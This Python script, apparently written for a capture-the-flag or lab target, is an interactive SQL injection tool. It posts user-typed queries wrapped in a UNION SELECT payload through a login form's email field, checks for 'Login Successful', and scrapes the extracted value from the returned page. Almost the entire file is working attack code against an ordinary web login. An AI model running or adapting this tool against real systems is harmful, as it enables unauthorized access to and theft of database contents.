import requests,sys,json
from urllib.parse import quote_plus
from bs4 import BeautifulSoup

# injection_point
url = sys.argv[1]

def oracle(q):
    payload = quote_plus(f"' UNION SELECT 1,2,3,{q}-- ")
    data = f"email={payload}&password=x" #modify it 
    #print(data)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    response = requests.post(url,data=data,headers = headers)
    #print(response.text)
    if "Login Successful" in response.text:
        return response.text

"""
assert oracle("OR 1=1")
assert not oracle("OR 1=0")
"""

#print(response.text)
while True:
    sql_payload = input(":")
    
    if sql_payload == "0":
        break

    html = oracle(sql_payload)
    if not html:
        print("not correct payload")
        continue

    soup = BeautifulSoup(html, "html.parser")
    h2 = soup.find("h2", class_="h4")

    if h2:
        result = h2.get_text().strip()
        print(result.split(" ",1)[1])
    else:
        print("not correct payload")
